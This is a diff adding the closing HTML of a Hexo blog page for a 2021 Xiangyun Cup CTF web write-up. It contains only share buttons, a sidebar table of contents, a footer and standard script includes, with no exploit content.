+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "https://fmyyy.gitee.io/2021/09/21/2021%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%AA%E4%BA%BAweb%E9%83%A8%E5%88%86wp/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "https://fmyyy.gitee.io/2021/09/21/2021%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%AA%E4%BA%BAweb%E9%83%A8%E5%88%86wp/";
+            const title         = "「2021祥云杯个人web部分wp」";
+            const excerpt       = `前言题目质量很高 被吊打
+ezyii说是最新的链子，题目把文件都筛选好了让我们找。写一下我的思路看到RunProcess类
+1234567891011121314151617181920212223242526272829303132...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    
+                </div>
+                <div class="pull-date">
+                <span>最后编辑：2021-09-21</span>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" Hello World" href="/2021/09/21/hello-world/">&lt; 上一篇</a>
+            </div>
+            
+            
+        </nav>
+    
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/avatar.webp" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix">
+    <div class="photo-background"></div>
+    <h4 class="widget-title no-after">
+        <i class="fa fa-compass"></i>
+        文章目录
+        <span class="toc-progress-bar"></span>
+    </h4>
+    <div class="textwidget">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezyii"><span class="toc-text">ezyii</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B"><span class="toc-text">安全检测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B1%82%E5%B1%82%E7%A9%BF%E9%80%8F"><span class="toc-text">层层穿透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crawer-z"><span class="toc-text">Crawer_z</span></a></li></ol>
+    </div>
+</aside>
+                
+                    <div class="sticky-area">
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTFwp/">CTFwp</a><span class="category-list-count">1</span></li></ul>
+  </aside>
+
+
+            
+                
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2021/09/21/2021%E7%A5%A5%E4%BA%91%E6%9D%AF%E4%B8%AA%E4%BA%BAweb%E9%83%A8%E5%88%86wp/"><i class="fa  fa-book"></i> 2021祥云杯个人web部分wp</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/09/21/hello-world/"><i class="fa  fa-book"></i> Hello World</a>
+            
+          
+        
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  >
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://t.me/CandyUnion"><i class="fa fa-telegram"></i></a></li>
+                        
+                        
+                        
+                        <li><a target="_blank" rel="me" href="https://nya.one/@Candinya"><i class="fa fa fa-share-alt-square"></i></a></li>
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/Candinya"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2021 fmyyy 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by fmyyy.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async type="text/javascript" src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+
+    <script defer src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+    <script defer src="/js/kr-dark.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
